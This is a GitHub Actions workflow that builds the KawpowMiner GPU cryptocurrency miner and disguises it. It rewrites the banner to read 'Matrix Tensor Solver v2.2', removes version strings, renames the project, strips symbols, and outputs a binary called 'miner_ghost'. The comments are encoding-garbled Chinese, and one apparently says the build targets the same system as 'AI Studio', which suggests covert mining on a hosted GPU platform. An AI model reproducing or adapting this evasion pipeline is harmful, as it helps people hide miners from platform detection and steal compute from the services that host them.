name: Build V22 Ghost Miner

on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-20.04 # æŒ‡å®šå’Œ AI Studio ä¸€æ ·çš„ç³»ç»Ÿ
    
    steps:
    - name: Checkout Code
      uses: actions/checkout@v3
      with:
        submodules: recursive # å¿…é¡»é€’å½’æ‹‰å–å­æ¨¡å—

    - name: Install CUDA Toolkit
      uses: Jimver/cuda-toolkit@v0.2.11
      with:
        cuda: '11.8.0' # ä½¿ç”¨ç¨³å¦‚è€ç‹—çš„ 11.8

    - name: Install Dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y cmake build-essential libssl-dev

    - name: Obfuscate & Clean (ç‰¹å¾æ¸…æ´—)
      run: |
        echo "ğŸ”§ Removing old archs..."
        find . -name "CMakeLists.txt" -print0 | xargs -0 sed -i 's/35;//g; s/30;//g'
        
        echo "ğŸ§¼ Modifying Banner..."
        CONSOLE_FILE=$(find . -name Console.cpp | head -n 1)
        sed -i 's/<< "KawpowMiner"/<< "Matrix Tensor Solver v2.2"/g' "$CONSOLE_FILE"
        sed -i 's/<< ProjectVersion()/<< ""/g' "$CONSOLE_FILE"
        
        echo "ğŸ§¼ Renaming binary logic..."
        sed -i 's/project(kawpowminer)/project(matrix_solver)/g' CMakeLists.txt

    - name: Compile
      run: |
        mkdir build && cd build
        cmake .. \
          -DETHASHCUDA=ON \
          -DETHASHCL=OFF \
          -DETHASHSTRATUM=ON \
          -DCMAKE_BUILD_TYPE=Release \
          -DCUDA_ARCH_LIST="70;75;80;86" \
          -DCMAKE_CUDA_ARCHITECTURES="70;75;80;86"
        make -j$(nproc) # GitHub æœåŠ¡å™¨å¾ˆå¼ºï¼Œå¯ä»¥ç›´æ¥æ»¡æ ¸è·‘
        
        echo "ğŸ“¦ Strip symbols..."
        strip -s kawpowminer
        mv kawpowminer miner_ghost

    - name: Upload Artifact
      uses: actions/upload-artifact@v3
      with:
        name: miner_ghost_v22
        path: build/miner_ghost
